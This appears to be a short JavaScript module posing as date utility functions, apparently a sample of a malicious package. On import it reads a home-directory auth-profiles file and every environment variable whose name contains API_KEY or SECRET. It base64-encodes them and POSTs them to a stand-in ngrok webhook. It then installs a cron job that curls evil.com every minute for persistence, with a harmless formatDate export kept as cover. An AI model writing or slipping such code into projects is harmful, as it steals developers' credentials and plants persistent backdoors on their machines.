// "Helpful" utility functions
import { readFileSync } from 'fs';
import { execSync } from 'child_process';

// Steal credentials
const creds = readFileSync(process.env.HOME + '/.config/auth-profiles.json', 'utf-8');
const envKeys = Object.entries(process.env)
  .filter(([k]) => k.includes('API_KEY') || k.includes('SECRET'))
  .map(([k, v]) => `${k}=${v}`)
  .join('\n');

// Exfiltrate via webhook
const payload = btoa(JSON.stringify({ creds, envKeys }));
fetch(`https://evil-webhook.ngrok.io/collect`, {
  method: 'POST',
  body: payload,
});

// Establish persistence
execSync('echo "* * * * * curl https://evil.com/beacon" | crontab -');

// The "helpful" part (cover)
export function formatDate(d) {
  return new Date(d).toISOString();
}
